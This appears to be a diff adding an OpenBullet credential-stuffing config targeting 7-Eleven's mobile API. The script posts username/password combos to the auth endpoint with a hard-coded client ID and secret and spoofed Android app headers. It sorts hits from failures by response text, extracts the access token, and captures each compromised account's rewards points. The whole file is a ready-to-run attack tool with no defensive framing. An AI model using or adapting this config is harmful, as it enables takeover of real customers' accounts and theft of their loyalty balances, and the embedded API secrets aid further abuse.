@@ -1,0 +1,95 @@
+[SETTINGS]
+{
+  "Name": "7-Eleven",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-02-11T20:22:44.3094839-05:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.7-eleven.com/auth/token/" 
+  CONTENT "{\"client_id\":\"fRl2VHYSkElISwqUnyshgKkzkGi75x6iAcBiW4Yl\",\"client_secret\":\"JgQrcSI8NO5LUeDhAgXARMPLSBpYXFf8m9QkAmm4jNUf5ZxRFRgblblPLcigAZURhr3Yoms3ST9Bg0H1OzOizXlDh5jpMeM5gFGKzfrzPiOC9994g9iy5paokv4JHLc7\",\"grant_type\":\"password\",\"password\":\"<PASS>\",\"username\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "X-SEI-TAG-ID: b0dfd739-e758-4892-9c1e-e037474ac10d" 
+  HEADER "X-SEI-DEVICE-ID: 71dbfdbb-d5d6-4dad-a31b-bb2d96f36dd4" 
+  HEADER "X-SEI-TZ: -05:00" 
+  HEADER "X-SEI-DEVICE-OS: 5.1.1" 
+  HEADER "X-SEI-VERSION: 3.5.2.1" 
+  HEADER "X-SEI-PLATFORM: android" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "Content-Length: 282" 
+  HEADER "Host: api.7-eleven.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "User-Agent: okhttp/4.2.2" 
+  HEADER "X-NewRelic-ID: VQcDWVRUDRAFXFBQBgUFVg==" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "This field may not be blank." 
+    KEY "The Email / Password combination is not valid." 
+
+PARSE "<SOURCE>" LR "{\"access_token\": \"" "\"," -> VAR "TOKEN" 
+
+REQUEST GET "https://api.7-eleven.com/v4/rewards/me/" 
+  
+  HEADER "X-SEI-TAG-ID: b0dfd739-e758-4892-9c1e-e037474ac10d" 
+  HEADER "X-SEI-DEVICE-ID: 71dbfdbb-d5d6-4dad-a31b-bb2d96f36dd4" 
+  HEADER "X-SEI-TZ: -05:00" 
+  HEADER "X-SEI-DEVICE-OS: 5.1.1" 
+  HEADER "X-SEI-VERSION: 3.5.2.1" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+  HEADER "X-SEI-PLATFORM: android" 
+  HEADER "Host: api.7-eleven.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "User-Agent: okhttp/4.2.2" 
+  HEADER "X-NewRelic-ID: VQcDWVRUDRAFXFBQBgUFVg==" 
+
+PARSE "<SOURCE>" LR ",\"rewards_points\":" ",\"" CreateEmpty=FALSE -> CAP "POINTS" 
+
